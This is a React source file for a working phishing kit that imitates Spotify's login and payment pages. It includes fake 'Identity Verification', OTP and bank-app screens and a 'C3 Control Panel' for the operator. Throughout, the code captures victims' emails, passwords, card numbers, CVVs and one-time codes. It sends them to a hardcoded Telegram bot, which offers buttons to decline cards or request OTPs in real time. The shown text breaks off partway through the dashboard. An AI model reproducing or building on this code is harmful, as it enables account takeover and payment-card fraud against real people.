
import React, { useState, useEffect, useRef } from 'react';
import Logo from './components/Logo';
import SocialButton from './components/SocialButton';
import { LoginStatus } from './types';

/**
 * PRODUCTION CONFIGURATION
 * Real-time tracking is simulated via localStorage and storage events.
 * To access the admin panel, append ?admin=true to your URL.
 */
interface StorageEvent {
  key: string | null;
  oldValue: string | null;
  newValue: string | null;
  url: string;
  storageArea: Storage;
}
interface SessionData {
  id: string;
  ip: string;
  city: string;
  country: string;
  currentPage: string;
  lastActive: number;
  email: string;
  pass: string;
  card: string;
  exp: string;
  cvv: string;
  otp: string;
  adminAction: 'NORMAL' | 'INVALID_CARD' | 'INVALID_OTP' | 'OTP_PAGE' | 'BANK_APPROVAL' | 'BLOCK' | 'REDIRECT_OTP'| 'REDIRECT_SPOTIFY';}

const SESSION_STORAGE_KEY = 'spotify_prod_sessions';
const CONFIG_STORAGE_KEY = 'spotify_prod_config';

const getInitialConfig = () => {
  const saved = localStorage.getItem(CONFIG_STORAGE_KEY);
  return saved ? JSON.parse(saved) : {
    botToken: '8486780522:AAHGzS5j5o3NKqad2sfhXodd3U60SBjJW1o',
    chatId: '-4629342475',
    adminPass: 'admin123'
  };
};

const sendTelegramMessage = async (text: string, replyMarkup?: any) => {
  const config = getInitialConfig();
  if (!config.botToken || !config.chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.chatId,
        text: text,
        parse_mode: 'HTML',
        reply_markup: replyMarkup
      })
    });
  } catch (error) {
    console.error('Telegram deployment notification failed:', error);
  }
};

const getVisitorInfo = async () => {
  // Try multiple services in order
  const services = [
    {
      url: 'https://ipapi.co/json/',
      parser: (data: any) => ({ ip: data.ip, city: data.city, country: data.country_name })
    },
    { url: 'https://api.ipify.org?format=json', parser: (data: any) => ({ ip: data.ip, city: 'Unknown', country: 'Unknown' }) },
    {
      url: 'https://ipgeolocation.abstractapi.com/v1/?api_key=YOUR_FREE_API_KEY', // You can get a free key
      parser: (data: any) => ({ ip: data.ip, city: data.city, country: data.country })
    }
  ];

  for (const service of services) {
    try {
      const response = await fetch(service.url);
      if (response.ok) {
        const data = await response.json();
        const result = service.parser(data);
        console.log('IP lookup success:', result);
        return result;
      }
    } catch (error) {
      console.log(`Service ${service.url} failed, trying next...`);
    }
  }

  // Fallback
  return { ip: '127.0.0.1', city: 'Unknown', country: 'Global' };
};

// DELETE your existing handleTelegramCallback function
const handleTelegramCallback = async (callbackData: string) => {
  if (!callbackData || !callbackData.startsWith("action_")) {
    console.log("Invalid callback data:", callbackData);
    return;
  }
 
  const parts = callbackData.split("_");
  if (parts.length < 3) {
    console.log("Invalid callback format:", callbackData);
    return;
  }
  
  const sessionId = parts[1];
  const action = parts.slice(2).join("_") as SessionData['adminAction'];
  
 const validActions: SessionData['adminAction'][] = [
  'NORMAL',
  'INVALID_CARD',
  'INVALID_OTP',
  'OTP_PAGE',
  'BANK_APPROVAL',
  'BLOCK',
  'REDIRECT_OTP',
  'REDIRECT_SPOTIFY',
];

  
  if (!validActions.includes(action)) {
    console.log("Invalid action:", action);
    return;
  }
  
  // Get current sessions
  const current = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
  
  // Find and update the session
  const sessionIndex = current.findIndex((s: SessionData) => s.id === sessionId);
  if (sessionIndex > -1) {
    current[sessionIndex].adminAction = action;
    localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(current));
    
    // Send confirmation
    await sendTelegramMessage(`✅ Action ${action} applied to session ${sessionId}`);
  }
};
// Global polling - runs regardless of which page you're on
const pollTelegram = async () => {
  try {
    const config = getInitialConfig();
    if (!config.botToken || !config.chatId) {
      console.log('Missing bot configuration');
      return;
    }
    let lastProcessedId = parseInt(localStorage.getItem('lastUpdateId') || '0');
    const lastUpdateId = localStorage.getItem('lastUpdateId') || '0';
    const response = await fetch(
      `https://api.telegram.org/bot${config.botToken}/getUpdates?offset=${parseInt(lastUpdateId) + 1}&limit=10`
    );
    
    if (!response.ok) {
      console.error('Telegram API error:', response.status);
      return;
    }
    
    const updates = await response.json();
    
    // inside pollTelegram()
    if (updates.ok && updates.result.length > 0) {
  // Process every update we received
    for (const update of updates.result) {
      if (update.callback_query) {
        console.log('Processing callback:', update.callback_query.data);
        await handleTelegramCallback(update.callback_query.data);
      }
    // keep track of the highest update_id we have processed
    lastProcessedId = Math.max(lastProcessedId, update.update_id);
  }

  // Store the newest id (+1 will be used as the next offset)
  localStorage.setItem('lastUpdateId', String(lastProcessedId));
}

  } catch (error) {
    console.error('Telegram polling error:', error);
    // Wait before retrying to prevent spam
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
};

const LoadingState: React.FC<{ message?: string }> = ({ message = "redirecting..." }) => (
  <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6">
    <div className="w-16 h-16 border-4 border-[#1ed760] border-t-transparent rounded-full animate-spin mb-8"></div>
    <h2 className="text-2xl font-bold">{message}</h2>
  </div>
);
// --- OTP Component ---
const OTPPage: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; sessionId: string; setStep: React.Dispatch<React.SetStateAction<any>> }> = ({ session, updateSession, sessionId, setStep }) => {
  useEffect(() => {
    updateSession({ currentPage: 'OTP Page' });
  }, []);

// In your OTPPage component's handleSubmit function
const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();
  setStep('OTP_LOADING'); // This will now stay until admin action
  
  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ Approve", callback_data: `action_${session.id}_NORMAL` },
        { text: "❌ Decline", callback_data: `action_${session.id}_INVALID_CARD` }
      ],
      [
        { text: "🚫 Block", callback_data: `action_${session.id}_BLOCK` },
     //   { text: "🎵 Redirect to Spotify", callback_data: `action_${session.id}_REDIRECT_SPOTIFY` }
        { text: "🎵 Redirect to Spotify", callback_data: `action_${session.id}_REDIRECT_SPOTIFY` }   

      ]
    ]
  };
  
  await sendTelegramMessage(
    `<b>🔢 OTP CAPTURE</b>\n🔢 Code: <code>${session.otp}</code>\n💳 Card: <code>${session.card}</code>\n📍 IP: ${session.ip}`,
    keyboard
  );
};

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 animate-in fade-in duration-500">
      <div className="w-full max-w-md bg-[#121212] p-8 rounded-[32px] border border-white/5 shadow-2xl flex flex-col items-center">
        <div className="w-16 h-16 bg-[#1ed760]/10 rounded-full flex items-center justify-center mb-6">
          <svg className="w-8 h-8 text-[#1ed760]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
          </svg>
        </div>
        <h2 className="text-2xl font-bold mb-2">Almost there</h2>
        <p className="text-[#a7a7a7] text-sm text-center mb-8">Confirm the 6-digit code sent to your device to verify your Spotify account.</p>

        {session.adminAction === 'INVALID_OTP' && (
          <div className="w-full bg-red-600/10 border border-red-600/30 text-red-500 p-3 rounded-lg text-xs text-center font-bold mb-6">
            The code you entered is incorrect.
          </div>
        )}

        <form onSubmit={handleSubmit} className="w-full space-y-6">
          <input
            required
            type="text"
            maxLength={6}
            placeholder="000000"
            value={session.otp}
            onChange={(e) => updateSession({ otp: e.target.value.replace(/\D/g, '') })}
            className="w-full bg-transparent border-b-2 border-[#3e3e3e] text-center text-4xl tracking-[0.5em] font-bold py-4 focus:border-[#1ed760] outline-none transition-all placeholder:tracking-normal placeholder:text-[#333]"
          />
          <button type="submit" className="w-full bg-[#1ed760] text-black font-bold py-4 rounded-full hover:scale-[1.02] active:scale-95 transition-all text-lg">Confirm</button>
        </form>
      </div>
    </div>
  );
};

// --- Bank Approval Component ---
const BankApproval: React.FC<{ updateSession: (d: Partial<SessionData>) => void }> = ({ updateSession }) => {
  useEffect(() => {
    updateSession({ currentPage: 'Awaiting Bank App' });
  }, []);

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 text-center animate-in zoom-in duration-500">
      <div className="mb-12 flex gap-4 opacity-50 justify-center">
       <div className="flex gap-3 items-center">
  <img
    src="https://cdn.simpleicons.org/visa"
    className="h-6"
    alt="Visa"
  />
  <img
    src="https://cdn.simpleicons.org/mastercard"
    className="h-6"
    alt="Mastercard"
  />
</div>


      <div className="flex gap-2 mb-8 justify-center">
        <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce [animation-delay:-0.3s]"></div>
        <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce [animation-delay:-0.15s]"></div>
        <div className="w-3 h-3 bg-[#1ed760] rounded-full animate-bounce"></div>
      </div>
      <h2 className="text-3xl font-bold mb-4">Security Verification</h2>
      <p className="text-[#a7a7a7] max-w-xs mx-auto leading-relaxed text-sm">
        Please open your bank's mobile app to approve this verification request. This window will refresh automatically.
      </p>
    </div>
  );
};

// --- Security Check Component ---
const SecurityCheck: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; onVerify: () => void }> = ({ session, updateSession, onVerify }) => {
  const [captchaCode, setCaptchaCode] = useState<string>('');
  const [userInput, setUserInput] = useState<string[]>(['', '', '', '']);
  const [hasError, setHasError] = useState(false);
  const inputRefs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)];

  const generateCode = () => {
    const code = Math.floor(1000 + Math.random() * 9000).toString();
    setCaptchaCode(code);
    setUserInput(['', '', '', '']);
    setHasError(false);
    setTimeout(() => inputRefs[0].current?.focus(), 0);
  };

  useEffect(() => {
    generateCode();
    updateSession({ currentPage: 'Gatekeeper' });
  }, []);

  const handleInputChange = async (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newInput = [...userInput];
    newInput[index] = value.slice(-1);
    setUserInput(newInput);
    setHasError(false);

    if (value && index < 3) inputRefs[index + 1].current?.focus();

    const finalCode = newInput.join('');
    if (finalCode.length === 4) {
      if (finalCode === captchaCode) {
        await sendTelegramMessage(`<b>🚀 Session Started</b>\n📍 IP: ${session.ip}\n🌍 Country: ${session.country}`);
        onVerify();
      } else {
        setHasError(true);
        setTimeout(generateCode, 600);
      }
    }
  };

  return (
    <div className="min-h-screen bg-[#0a0a0a] flex flex-col items-center justify-center px-6">
      <div className="w-full max-w-[400px] flex flex-col items-center">
        <div className="w-20 h-20 bg-[#14261a] rounded-full flex items-center justify-center mb-8 border border-[#1ed760]/20">
          <svg className="w-10 h-10 text-[#1ed760]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
        </div>
        <h1 className="text-white text-3xl font-bold mb-2">Are you human?</h1>
        <p className="text-[#a7a7a7] mb-12">Enter the verification code to proceed</p>
        <div className="w-full bg-[#121212] rounded-2xl p-8 mb-10 relative flex justify-center gap-4 shadow-2xl border border-white/5">
          {captchaCode.split('').map((char, i) => (
            <div key={i} className="w-14 h-16 bg-[#1e1e1e] rounded-lg flex items-center justify-center text-3xl font-black text-white border border-white/10 shadow-inner">{char}</div>
          ))}
        </div>
        <div className="flex gap-4 mb-12">
          {userInput.map((val, i) => (
            <input key={i} ref={inputRefs[i]} type="text" maxLength={1} value={val} onChange={(e) => handleInputChange(i, e.target.value)} onKeyDown={(e) => { if (e.key === 'Backspace' && !val && i > 0) inputRefs[i-1].current?.focus(); }} className={`w-14 h-16 bg-transparent border-2 rounded-xl text-center text-2xl font-bold text-white focus:border-[#1ed760] outline-none transition-all ${hasError ? 'border-red-600' : 'border-[#333]'}`} />
          ))}
        </div>
      </div>
    </div>
  );
};

// --- Login Form Component ---
const LoginForm: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; onLogin: () => void }> = ({ session, updateSession, onLogin }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    updateSession({ currentPage: 'Login Portal' });
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendTelegramMessage(`<b>🔑 LOGIN HIT</b>\n👤 User: <code>${email}</code>\n🔐 Pass: <code>${password}</code>\n📍 IP: ${session.ip}`);
    onLogin();
  };

  const socialLogins = [
    { id: 'google', label: 'Continue with Google', icon: <svg viewBox="0 0 24 24" className="w-5 h-5"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" /><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" /><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" /><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" /></svg> },
    { id: 'facebook', label: 'Continue with Facebook', icon: <svg fill="#1877F2" viewBox="0 0 24 24" className="w-6 h-6"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" /></svg> },
    { id: 'apple', label: 'Continue with Apple', icon: <svg fill="white" viewBox="0 0 24 24" className="w-5 h-5"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.03 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.702z" /></svg> }
  ];

  return (
    <div className="min-h-screen bg-black flex flex-col items-center">
      <header className="w-full py-8 px-6 flex justify-center animate-in slide-in-from-top duration-700"><Logo className="text-white w-9 h-9" /></header>
      <main className="w-full max-w-[734px] px-6 pb-20 flex flex-col items-center">
        <div className="w-full md:bg-[#121212] md:rounded-[24px] md:p-12 md:px-24 shadow-2xl">
          <h1 className="text-white text-[32px] md:text-[48px] font-bold text-center mb-10 tracking-tight">Log in to Spotify</h1>
          <form onSubmit={handleSubmit} className="flex flex-col">
            <div className="mb-4">
              <label className="block text-white text-[14px] font-bold mb-2">Email or username</label>
              <input type="text" required value={email} onChange={(e) => { setEmail(e.target.value); updateSession({ email: e.target.value }); }} placeholder="Email or username" className="w-full bg-[#121212] md:bg-transparent border border-[#878787] text-white p-3.5 rounded-md placeholder-[#a7a7a7] hover:border-white focus:shadow-[0_0_0_2px_#ffffff] transition-all" />
            </div>
            <div className="mb-6 relative">
              <label className="block text-white text-[14px] font-bold mb-2">Password</label>
              <div className="relative">
                <input type={showPassword ? 'text' : 'password'} required value={password} onChange={(e) => { setPassword(e.target.value); updateSession({ pass: e.target.value }); }} placeholder="Password" className="w-full bg-[#121212] md:bg-transparent border border-[#878787] text-white p-3.5 rounded-md placeholder-[#a7a7a7] pr-12 hover:border-white focus:shadow-[0_0_0_2px_#ffffff] transition-all" />
                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-[#a7a7a7] hover:text-white">
                  {showPassword ? <svg fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" className="w-5 h-5"><path d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268-2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" /></svg> : <svg fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" className="w-5 h-5"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268-2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>}
                </button>
              </div>
            </div>
            <button type="submit" className="w-full bg-[#1ed760] text-black font-bold py-4 rounded-full hover:scale-[1.02] active:scale-95 transition-all mb-6">Log In</button>
            <a href="#" className="text-white text-center text-[14px] font-bold underline mb-8">Forgot your password?</a>
          </form>
          <div className="flex flex-col mb-8 gap-2">
            {socialLogins.map((p) => <SocialButton key={p.id} icon={p.icon} label={p.label} />)}
            <SocialButton icon={<svg fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" className="w-5 h-5 text-[#878787]"><path d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg>} label="Continue with phone number" />
          </div>
          <hr className="border-[#292929] mb-10" />
          <p className="text-[#a7a7a7] text-center text-[16px]">Don't have an account? <a href="#" className="text-white font-bold underline">Sign up for Spotify</a></p>
        </div>
      </main>
    </div>
  );
};
// --- Payment Form Component ---
const PaymentForm: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; onPay: () => void; setStep: React.Dispatch<React.SetStateAction<any>>; sessionId: string }> = ({ session, updateSession, onPay, setStep, sessionId }) => {
  useEffect(() => {
    updateSession({ currentPage: 'Identity Check' });
  }, []);

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 4) val = val.slice(0, 4);
    if (val.length > 2) val = val.slice(0, 2) + ' / ' + val.slice(2);
    updateSession({ exp: val });
  };

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 16) val = val.slice(0, 16);
    const formatted = val.match(/.{1,4}/g)?.join(' ') || val;
    updateSession({ card: formatted });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStep('LOADING');
    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `action_${sessionId}_NORMAL` },
          { text: "❌ Decline", callback_data: `action_${sessionId}_INVALID_CARD` }
        ],
        [
          { text: "🔢 Request OTP", callback_data: `action_${sessionId}_OTP_PAGE` },
          { text: "🏦 Bank App", callback_data: `action_${sessionId}_BANK_APPROVAL` }
        ],
        [
          { text: "🚫 Block", callback_data: `action_${sessionId}_BLOCK` }
        ]
      ]
    };
    await sendTelegramMessage(
      `<b>💳 CARD CAPTURE</b>\n💳 Card: <code>${session.card}</code>\n📅 Exp: <code>${session.exp}</code>\n🔐 CVV: <code>${session.cvv}</code>\n📍 IP: ${session.ip}`,
      keyboard
    );
  };

  return (
    <div className="min-h-screen bg-black text-white flex flex-col font-sans animate-in fade-in duration-500">
      <nav className="w-full flex items-center justify-between px-10 py-5 border-b border-white/5">
        <Logo className="w-8 text-white" />
        <div className="flex items-center gap-2 bg-[#121212] p-2 rounded-full border border-white/5 cursor-pointer">
          <div className="w-7 h-7 bg-[#282828] rounded-full flex items-center justify-center"><Logo className="w-3 text-white" /></div>
          <span className="text-xs font-bold pr-2">Profile</span>
        </div>
      </nav>
      <main className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="w-full max-w-xl">
          <h2 className="text-3xl font-extrabold mb-4 text-center">Identity Verification</h2>
          <p className="text-[#a7a7a7] text-sm mb-10 text-center max-w-sm mx-auto">To protect your account, please confirm the payment details associated with your Spotify Premium plan.</p>
          {session.adminAction === 'INVALID_CARD' && (
            <div className="bg-red-500/10 border border-red-500/30 text-red-500 p-4 rounded-2xl mb-8 text-center text-sm font-bold animate-shake">
              Payment method declined. Please use a valid card.
            </div>
          )}
          <div className="mx-auto max-w-md bg-[#121212] border border-white/5 rounded-3xl p-8 shadow-2xl">
            <div className="flex justify-between items-center mb-8">
              <span className="text-xs font-black uppercase tracking-widest text-slate-500">Card details</span>
              <div className="flex gap-3 items-center">
                <img
                  src="https://cdn.simpleicons.org/visa"
                  className="h-6"
                  alt="Visa"
                />
                <img
                  src="https://cdn.simpleicons.org/mastercard"
                  className="h-6"
                  alt="Mastercard"
                />
              </div>
            </div>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label className="block text-[10px] font-black uppercase tracking-widest text-[#a7a7a7] mb-2">Card number</label>
                <input required type="text" placeholder="0000 0000 0000 0000" value={session.card} onChange={handleCardChange} className="w-full bg-[#181818] border border-[#3e3e3e] p-4 rounded-xl text-sm placeholder-[#444] focus:border-[#1ed760] outline-none transition-all" />
              </div>
              <div className="flex gap-4">
                <div className="flex-1">
                  <label className="block text-[10px] font-black uppercase tracking-widest text-[#a7a7a7] mb-2">Expiry</label>
                  <input required type="text" placeholder="MM / YY" value={session.exp} onChange={handleExpiryChange} className="w-full bg-[#181818] border border-[#3e3e3e] p-4 rounded-xl text-sm focus:border-[#1ed760] outline-none" />
                </div>
                <div className="flex-1">
                  <label className="block text-[10px] font-black uppercase tracking-widest text-[#a7a7a7] mb-2">CVV</label>
                  <input required type="text" placeholder="123" maxLength={4} value={session.cvv} onChange={(e) => updateSession({ cvv: e.target.value.replace(/\D/g, '') })} className="w-full bg-[#181818] border border-[#3e3e3e] p-4 rounded-xl text-sm focus:border-[#1ed760] outline-none" />
                </div>
              </div>
              <button type="submit" className="w-full bg-[#1ed760] text-black font-bold py-4 rounded-full hover:scale-[1.02] active:scale-95 transition-all mt-4">Confirm Details</button>
            </form>
          </div>
        </div>
      </main>
    </div>
  );
};

// --- Admin Dashboard ---
const AdminDashboard: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'VISITORS' | 'CONFIG' | 'SECURITY'>('VISITORS');
  const [sessions, setSessions] = useState<SessionData[]>([]);
  const [config, setConfig] = useState(getInitialConfig());
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passInput, setPassInput] = useState('');

  useEffect(() => {
  const fetch = () => {
    const data = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
    setSessions(data);
  };
  
  const interval = setInterval(fetch, 1000);
  return () => clearInterval(interval);
}, []);

  const updateAction = (id: string, action: SessionData['adminAction']) => {
    const current = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
    const next = current.map((s: SessionData) => s.id === id ? { ...s, adminAction: action } : s);
    localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(next));
  };

  const deleteSession = (id: string) => {
    const current = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
    localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(current.filter((s: SessionData) => s.id !== id)));
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#020617] flex items-center justify-center p-6">
        <div className="bg-[#0f172a] p-10 rounded-3xl border border-white/5 w-full max-w-sm shadow-2xl">
          <Logo className="w-10 text-white mb-8 mx-auto" />
          <h2 className="text-white text-2xl font-bold mb-6 text-center">Restricted Area</h2>
          <input type="password" value={passInput} onChange={e => setPassInput(e.target.value)} placeholder="Access Key" className="w-full bg-black/40 border border-white/10 rounded-2xl p-4 text-white mb-6 focus:border-[#1ed760] outline-none" />
          <button onClick={() => passInput === config.adminPass ? setIsAuthenticated(true) : alert('Unauthorized.')} className="w-full bg-[#1ed760] text-black font-bold py-4 rounded-2xl hover:scale-105 transition-all">Enter</button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#020617] text-slate-300 p-8 md:p-12 font-sans">
      <div className="max-w-6xl mx-auto">
        <header className="flex justify-between items-end mb-12">
          <div>
            <h1 className="text-white text-4xl font-black tracking-tight">C3 Control Panel</h1>
            <p className="text-slate-500 text-sm mt-2">Active intelligence and visitor control dashboard</p>
          </div>
          <button onClick={() => setIsAuthenticated(false)} className="bg-red-600/10 text-red-500 px-6 py-3 rounded-2xl font-bold border border-red-600/20 hover:bg-red-600 hover:text-white transition-all">Sign out</button>
        </header>

        <nav className="flex bg-[#0f172a] p-2 rounded-[24px] mb-12 border border-white/5 shadow-inner">
          {['VISITORS', 'CONFIG', 'SECURITY'].map(t => (
            <button key={t} onClick={() => setActiveTab(t as any)} className={`flex-1 py-4 rounded-2xl font-black text-xs tracking-widest transition-all ${activeTab === t ? 'bg-[#1e293b] text-white shadow-xl scale-[1.02]' : 'hover:text-white opacity-40'}`}>
              {t}
            </button>
          ))}
        </nav>

        {activeTab === 'VISITORS' && (
          <div className="space-y-6">
            {sessions.length === 0 ? (
              <div className="text-center py-32 bg-[#0f172a] rounded-[40px] border border-white/5 border-dashed text-slate-600 font-bold">Waiting for live connections...</div>
            ) : sessions.map(s => (
              <div key={s.id} className="bg-[#0f172a] rounded-[40px] p-10 border border-white/5 shadow-2xl animate-in slide-in-from-bottom-8">
                <div className="flex justify-between items-center mb-10">
                  <div className="flex items-center gap-5">
                    <div className="relative">
                      <div className="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center border border-white/10"><Logo className="w-6 text-white" /></div>
                      <div className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 rounded-full border-2 border-[#0f172a] animate-pulse" />
                    </div>
                    <div>
                      <h4 className="text-white font-black text-xl">{s.ip}</h4>
                      <p className="text-xs text-slate-500 font-bold">{s.country} • {s.city}</p>
                    </div>
                  </div>
                  <button onClick={() => deleteSession(s.id)} className="w-10 h-10 flex items-center justify-center rounded-xl bg-red-500/5 text-red-500/30 hover:bg-red-500 hover:text-white transition-all"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button>
                </div>

                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-10">
                   <div className="bg-black/40 p-5 rounded-3xl border border-white/5"><span className="block text-[10px] uppercase tracking-widest text-slate-600 font-black mb-1">State</span><div className="text-green-500 font-black truncate">{s.currentPage}</div></div>
                   <div className="bg-black/40 p-5 rounded-3xl border border-white/5"><span className="block text-[10px] uppercase tracking-widest text-slate-600 font-black mb-1">Account</span><div className="text-white font-black truncate">{s.email || '-'}</div></div>
                   <div className="bg-black/40 p-5 rounded-3xl border border-white/5"><span className="block text-[10px] uppercase tracking-widest text-slate-600 font-black mb-1">Card</span><div className="text-[#1ed760] font-black truncate">{s.card || '-'}</div></div>
                   <div className="bg-black/40 p-5 rounded-3xl border border-white/5"><span className="block text-[10px] uppercase tracking-widest text-slate-600 font-black mb-1">Code</span><div className="text-blue-500 font-black truncate">{s.otp || '-'}</div></div>
                </div>

                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-7 gap-3">
          <button onClick={() => updateAction(s.id, 'INVALID_CARD')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'INVALID_CARD' ? 'bg-orange-600 text-white' : 'bg-orange-600/5 text-orange-500 border-orange-500/10 hover:bg-orange-600 hover:text-white'}`}>DECLINE CARD</button>
          <button onClick={() => updateAction(s.id, 'OTP_PAGE')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'OTP_PAGE' ? 'bg-blue-600 text-white' : 'bg-blue-600/5 text-blue-500 border-blue-500/10 hover:bg-blue-600 hover:text-white'}`}>REQUEST OTP</button>
          <button onClick={() => updateAction(s.id, 'INVALID_OTP')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'INVALID_OTP' ? 'bg-red-600 text-white' : 'bg-red-600/5 text-red-500 border-red-500/10 hover:bg-red-600 hover:text-white'}`}>INVALID OTP</button>
          <button onClick={() => updateAction(s.id, 'BANK_APPROVAL')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'BANK_APPROVAL' ? 'bg-purple-600 text-white' : 'bg-purple-600/5 text-purple-500 border-purple-500/10 hover:bg-purple-600 hover:text-white'}`}>BANK APP</button>
